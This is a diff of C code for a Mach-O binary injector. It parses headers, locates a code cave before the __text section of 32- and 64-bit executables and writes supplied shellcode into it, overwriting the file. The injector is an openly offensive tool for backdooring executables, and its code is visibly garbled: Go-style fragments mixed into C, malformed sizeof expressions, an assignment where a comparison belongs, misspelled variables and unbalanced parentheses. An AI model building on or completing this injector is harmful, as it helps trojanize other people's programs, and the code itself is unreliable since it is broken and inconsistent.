@@ -6,15 +6,28 @@ int binject_MACH-O(char *file,char *shellcode)
   fseek(f,0,SEEK_END);
    size=ftell(f);
    char *file_buffer = calloc(1,size);
-	shellcodefixed = ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
-				scfixedlen=strlen(shellcodefixed);
-	uint32_t caveOffset,cave_len,a,b,c;
-	caveOffset+= 0x20;
-	caveOffset+=machoFile.FileHeader.Cmdsz
-for(a=0;a<ncommands;a++)
+	uint32_t caveOffset,cave_len;
+	struct mach_header *header= (struct mach_header*)buf;
+	char *address=buf;
+	if(header->magic==MH_MAGIC_64)
+	{
+		
+	        address+=sizeof(struct(mach_header_64);
+	}
+	if(header->magic=MH_MAGIC)
+	{
+					address+=sizeof(struct(mach_header);
+	}
+							
+	else
+	{
+		return -1;
+	}
+	
+for(uint32_t a=0;a<ncommands;a++)
  {
 					load_command *cmd=(struct load_command*)address;
-    for(b=0;b<sections;b++)
+    for(uint32_t b=0;b<sections;b++)
   {
      if (loadCommand->cmd == LC_SEGMENT)
         {
@@ -23,13 +36,15 @@ for(a=0;a<ncommands;a++)
             {
                 uint32_t *sectionAddress = address + sizeof(struct segment_command);
                 struct section *sectionCommand = NULL; 
-                for (c = 0; c < segmentCommand->nsects; c++)
+                for (uint32_t c = 0; c < segmentCommand->nsects; c++)
                 {
-			sectionCommand = (struct section*)(sectionAddress);
+			struct section *sectionCommand = (struct section*)(sectionAddress);
                     if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                     {
-                      
-			if(scfixedlen<sectionCommand->offset-caveOffset)
+                       uint32_t caveOffset += 0x20;
+	              caveOffset += header->sizeofcmds;
+			uint32_t    cavelen= sectionComman->offset-caveOffset;
+			if(scfixedlen<cavelen)
 			{
 				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
 				 fwrite(buf,1,size,f);
@@ -40,8 +55,35 @@ for(a=0;a<ncommands;a++)
                 }
             }
           }
+			       
      
-   }
+				       }
+				       if (loadCommand->cmd == LC_SEGMENT_64)
+        {
+            struct segment_command_64 *segmentCommand64 = (struct segment_command_64*)address;
+            if (strncmp(segmentCommand64->segname, "__TEXT", 16) == 0)
+            {
+                uint32_t *sectionAddress = address + sizeof(struct segment_command_64);
+               
+                for (uint32_t x = 0; x < segmentCommand64->nsects; x++)
+                {
+                     struct section_64 sectionCommand64 = (struct section_64*)(sectionAddress);
+                    if (strncmp(sectionCommand64->sectname, "__text", 16) == 0)
+                    {
+                       uint32_t caveOffset += 0x20;
+	              caveOffset += header->sizeofcmds;
+			uint32_t    cavelen= sectionCommand->offset-caveOffset;
+			if(scfixedlen<cavelen)
+			{
+				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
+				 fwrite(buf,1,size,f);
+			break;
+		        }    
+                    }
+                    sectionAddress += sizeof(struct section_64);
+                }
+            }
+        }
 				       address+=cmd->cmdsize;
  }                
 return -1;				       
